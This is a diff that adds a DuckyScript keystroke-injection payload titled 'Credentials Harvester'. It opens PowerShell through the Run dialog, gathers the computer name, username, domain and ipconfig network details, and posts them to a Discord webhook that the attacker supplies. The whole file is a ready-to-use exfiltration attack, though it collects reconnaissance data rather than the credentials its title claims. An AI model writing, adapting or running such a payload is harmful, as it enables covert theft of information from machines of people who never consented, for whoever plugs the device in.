@@ -1,0 +1,15 @@
+REM author: cyb3rloud
+REM Title: Credentials Harvester 
+REM Description: Gets User creds and shares them to Discord via a webhook
+REM Create a server and add your own webhook in the script 
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING . { $webhook = 'WEBHOOK HERE'; $recon = "=== SYSTEM RECON ===`nTime: $(Get-Date)`nComputer: $env:COMPUTERNAME`nUsername: $env:USERNAME`nDomain: $env:USERDOMAIN`n`n=== NETWORK INFO ===`n$(ipconfig | Out-String)"; $body = @{ content = $recon } | ConvertTo-Json; try { Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json' ; Write-Output "Message sent successfully to Discord." } catch { Write-Error "Failed to send message to Discord: $_" } }
+ENTER
+DELAY 500
+STRING exit
+ENTER
